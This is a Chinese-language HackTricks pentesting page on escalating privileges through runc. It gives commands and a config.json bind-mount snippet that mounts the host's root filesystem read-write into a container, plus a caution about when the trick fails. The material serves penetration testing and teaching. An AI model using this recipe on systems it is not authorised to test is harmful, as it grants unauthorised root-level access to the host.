# RunC 权限提升

{{#include ../../banners/hacktricks-training.md}}

## 基本信息

如果你想进一步了解 **runc**，请查看以下页面：

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

如果发现主机上安装了 `runc`，你可能能够**运行一个将主机的 root / 目录挂载到容器中的容器**。
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> 这并不总是可行，因为 runc 的默认操作是以 root 身份运行，因此以非特权用户身份运行它根本无法工作（除非你使用 rootless 配置）。将 rootless 配置设为默认通常不是一个好主意，因为在 rootless 容器中存在相当多在非 rootless 容器外不适用的限制。

{{#include ../../banners/hacktricks-training.md}}
